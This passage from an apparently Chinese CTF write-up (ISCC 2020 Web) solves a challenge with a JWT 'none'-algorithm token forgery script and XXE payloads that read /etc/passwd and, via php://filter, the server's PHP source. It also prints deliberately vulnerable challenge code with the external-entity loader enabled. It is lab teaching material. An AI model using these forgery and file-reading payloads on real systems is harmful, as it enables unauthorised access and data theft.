    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$arr_filename</span><span class="token punctuation">[</span><span class="token string">'extension'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$arr_filename</span><span class="token punctuation">[</span><span class="token string">'extension'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">//先验证后缀名</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$arr_filename</span><span class="token punctuation">[</span><span class="token string">'extension'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$type</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//转换成小写，在比较</span>
        <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'你传的好像不是图片哦~(后缀名不是'</span><span class="token punctuation">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span><span class="token variable">$type</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'中的一个)'</span><span class="token punctuation">;</span>
        <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'return'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$return_data</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment" spellcheck="true">//验证MIME类型，MIME类型可以被绕过</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$mime</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'你上传的是个假图片，不要欺骗我xxx！'</span><span class="token punctuation">;</span>
        <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'return'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$return_data</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">//通过getimagesize来读取图片的属性，从而判断是不是真实的图片，还是可以被绕过的</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'你上传的是个假图片，不要欺骗我！'</span><span class="token punctuation">;</span>
        <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'return'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$return_data</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">//验证大小</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'size'</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token variable">$size</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'上传文件的大小不能超过'</span><span class="token punctuation">.</span><span class="token variable">$size</span><span class="token punctuation">.</span><span class="token string">'byte(500kb)'</span><span class="token punctuation">;</span>
        <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'return'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$return_data</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment" spellcheck="true">//把上传的文件给他搞一个新的路径存起来</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$save_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$save_path</span><span class="token punctuation">,</span><span class="token number">0777</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'上传文件保存目录创建失败，请检查权限!'</span><span class="token punctuation">;</span>
            <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'return'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token variable">$return_data</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">//生成一个新的文件名，并将新的文件名和之前获取的扩展名合起来，形成文件名称</span>
    <span class="token variable">$new_filename</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">100000</span><span class="token punctuation">,</span><span class="token number">999999</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$arr_filename</span><span class="token punctuation">[</span><span class="token string">'extension'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$arr_filename</span><span class="token punctuation">[</span><span class="token string">'extension'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$arr_filename</span><span class="token punctuation">[</span><span class="token string">'extension'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//小写保存</span>
        <span class="token variable">$new_filename</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token string">".{$arr_filename['extension']}"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">//将tmp目录里面的文件拷贝到指定目录下并使用新的名称</span>
    <span class="token variable">$save_path</span><span class="token operator">=</span><span class="token function">rtrim</span><span class="token punctuation">(</span><span class="token variable">$save_path</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$save_path</span><span class="token punctuation">.</span><span class="token variable">$new_filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'临时文件移动失败，请检查权限!'</span><span class="token punctuation">;</span>
        <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'return'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$return_data</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">//如果以上都通过了，则返回这些值，存储的路径，新的文件名（不要暴露出去）</span>
    <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'save_path'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$save_path</span><span class="token punctuation">.</span><span class="token variable">$new_filename</span><span class="token punctuation">;</span>
    <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$new_filename</span><span class="token punctuation">;</span>
    <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'return'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$return_data</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="未知的风险-1"><a href="#未知的风险-1" class="headerlink" title="未知的风险-1"></a>未知的风险-1</h2><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501184019059.png" alt="image-20200501184019059"></p>
<p>考点：JWT攻击、XXE</p>
<p>题目打开，显示<code>hello guest;</code></p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200508124015426.png" alt="image-20200508124015426"></p>
<p>猜测应该是用户身份伪造，查看Cookie</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200508124113434.png" alt="image-20200508124113434"></p>
<p>从Cookie中的token格式可以看出来是通过JWT进行身份验证的</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200508124304182.png" alt="image-20200508124304182"></p>
<p>jwt解码可以看到Head里面的签名算法和payload里面的用户验证id，下来就是要绕过用户guest，达到任意用户身份伪造。</p>
<p>一般常见的JWT攻击手法主要包括四种：</p>
<ul>
<li>算法修改</li>
<li>密钥可控</li>
<li>密钥爆破</li>
<li>None签名</li>
</ul>
<p>知道了上面的四种攻击手法之后，先对网站进行敏感信息探测是否存在密钥key泄露问题（【X】未果）,接着尝试对上面的token进行密钥的爆破，使用常用的jwt弱密钥爆破工具<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">c-jwt-cracker: JWT brute force cracker written in C</a>进行爆破</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200508125603744.png" alt="image-20200508125603744"></p>
<p>很长时间没爆出来，发现无效，尝试制作相关的弱口令字典</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200508125843996.png" alt="image-20200508125843996"></p>
<p>使用自制字典利用工具<a href="https://github.com/Ch1ngg/JWTPyCrack" target="_blank" rel="noopener">JWTPyCrack</a>协助再次进行爆破（结果总是令人伤感的23333）</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200508130310598.png" alt="image-20200508130310598"></p>
<p>测试到这里只有最后一种攻击手法了，利用很简单，直接伪造任意用户id，并使用None签名算法进行伪造Token。</p>
<p>根据题目描述只有用户<code>user</code>才有权限进行后续的操作，于是对用户<code>user</code>进行身份伪造</p>
<p>伪造脚本</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> jwt
token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"id"</span><span class="token punctuation">:</span><span class="token string">"user"</span><span class="token punctuation">,</span><span class="token string">"iat"</span><span class="token punctuation">:</span><span class="token string">"1588902740"</span><span class="token punctuation">,</span> <span class="token string">"jti"</span><span class="token punctuation">:</span> <span class="token string">"cd811589c43d3d507c64b14a6f64e8d8"</span><span class="token punctuation">}</span><span class="token punctuation">,</span>algorithm<span class="token operator">=</span><span class="token string">"none"</span><span class="token punctuation">,</span>key<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200508131224670.png" alt="image-20200508131224670"></p>
<p>（在这里，细心的话会发现JWT的第三部分是空的，因为签名算法为None，密钥Key为空）</p>
<p>利用生成伪造的user身份的Token替换原有Token进行伪造用户验证</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200508132207058.png" alt="image-20200508132207058"></p>
<p>伪造的用户user通过验证，进入用户登录界面，查看源码，发现存在用户名和密码通过XML进行处理</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200508132359227.png" alt="image-20200508132359227"></p>
<p>直接抓包进行XXE漏洞的探测，构造XXE Payload进行敏感文件的读取</p>
<pre class="line-numbers language-xml"><code class="language-xml"><span class="token doctype">&lt;!DOCTYPE message [
    &lt;!ENTITY file SYSTEM "file:///etc/passwd"></span>
]>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>66666<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>利用payload探测发现内容读取的文件正常回显，并且没有对用户的输入进行过滤</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200508132515813.png" alt="image-20200508132515813"></p>
<p>既然存在XXE漏洞且不存在过滤，尝试读取源码doLogin.php</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200508133131147.png" alt="image-20200508133131147"></p>
<p>从结果分析，存在xxe漏洞为什么读取不了呢，这里就需要注意了，php文件的格式<code>&lt;?php ?&gt;</code>类似XML文件<code>&lt;?xml ?&gt;</code>，如果不做处理直接读取是读不出来的，因为其会把php文件当作xml进行解析导致读取出现问题，既然这样可以使用<code>php://filter</code>对文件进行base64编码再显示，这样就不会出现上述问题</p>
<p>再次构造Payload</p>
<pre class="line-numbers language-xml"><code class="language-xml"><span class="token doctype">&lt;!DOCTYPE message [
    &lt;!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=doLogin.php"></span>
]>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>66666<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200508133800705.png" alt="image-20200508133800705"></p>
<p>可以看到这次结果正常，提取编码后的结果进行base64解码</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200508133855004.png" alt="image-20200508133855004"></p>
<p>从源码中可以看到包含有flag.php，利用上述payload直接读取得到flag</p>
<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200508134419850.png" alt="image-20200508134419850"></p>
<pre><code>flag{get_the_methodd}</code></pre><p><strong>附题目源码</strong></p>
<ul>
<li>index.php</li>
</ul>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"jwt_debug_none.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$jwt</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Jwt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$ip</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$payload</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'guest'</span><span class="token punctuation">,</span><span class="token string">'iat'</span><span class="token operator">=</span><span class="token operator">></span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'jti'</span><span class="token operator">=</span><span class="token operator">></span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$cookie</span><span class="token operator">=</span><span class="token variable">$jwt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getToken</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">,</span><span class="token variable">$cookie</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$cookie</span><span class="token operator">=</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$identity</span><span class="token operator">=</span><span class="token string">'guest'</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$jwt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">verifyToken</span><span class="token punctuation">(</span><span class="token variable">$cookie</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$identity</span><span class="token operator">=</span><span class="token variable">$jwt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getidentity</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token variable">$identity</span><span class="token operator">=</span><span class="token string">'guest'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$allowedPages</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
    <span class="token string">'guest'</span>     <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'./in.html'</span><span class="token punctuation">,</span>
    <span class="token string">'user'</span>    <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'./login_for_user.html'</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$allowedPages</span><span class="token punctuation">[</span><span class="token variable">$identity</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$allowedPages</span><span class="token punctuation">[</span><span class="token variable">$identity</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token variable">$allowedPages</span><span class="token punctuation">[</span><span class="token string">"guest"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>doLogin.php</li>
</ul>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"jwt_debug_none.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$ip</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$jwt</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Jwt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$USERNAME</span> <span class="token operator">=</span> <span class="token string">'adm_in'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//账号</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>

<span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input');</span>

<span class="token keyword">try</span><span class="token punctuation">{</span>
<span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$dom</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token constant">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token constant">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//echo var_dump($dom);</span>
<span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">;</span>
<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">==</span> <span class="token variable">$USERNAME</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">==</span> <span class="token variable">$PASSWORD</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//if not null</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
<span class="token punctuation">}</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>Exception <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Type: text/html; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="未知的风险-2"><a href="#未知的风险-2" class="headerlink" title="未知的风险-2"></a>未知的风险-2</h2><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200513090731700.png" alt="image-20200513090731700"></p>
<p>考点：PHP对象注入、代码审计、序列化</p>
<p>题目上来给了一个文件上传的服务，没有直接去测试，对网站进行敏感信息收集，发现存在<code>robots.txt</code>泄露</p>
<pre><code>User-agent: *
Disallow: /index.txt</code></pre><p>访问<code>index.txt</code>获取网站源码</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'secret.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$sandbox_dir</span> <span class="token operator">=</span> <span class="token string">'sandbox/'</span><span class="token punctuation">.</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">global</span> <span class="token variable">$sandbox_dir</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">myserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"../"</span><span class="token punctuation">,</span><span class="token string">"./"</span><span class="token punctuation">,</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
